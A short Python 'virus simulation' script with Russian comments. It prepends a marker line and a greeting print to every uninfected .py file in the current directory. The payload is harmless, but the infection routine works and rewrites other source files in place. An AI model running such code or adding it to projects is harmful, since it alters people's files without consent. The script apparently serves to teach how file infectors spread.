# virus_simulation.py
import os

# Простой "вирус", который добавляет код в другие .py файлы
virus_code = '''
# INFECTED
print("Привет от вируса!")
'''

def is_infected(filepath):
    with open(filepath, 'r') as f:
        return '# INFECTED' in f.read()

def infect_file(filepath):
    if filepath.endswith('.py') and not is_infected(filepath):
        with open(filepath, 'r') as f:
            original_code = f.read()
        with open(filepath, 'w') as f:
            f.write(virus_code + '\n' + original_code)
        print(f"Файл заражён: {filepath}")

# Заражаем все .py файлы в текущей директории
for file in os.listdir('.'):
    if file != __file__:
        infect_file(file)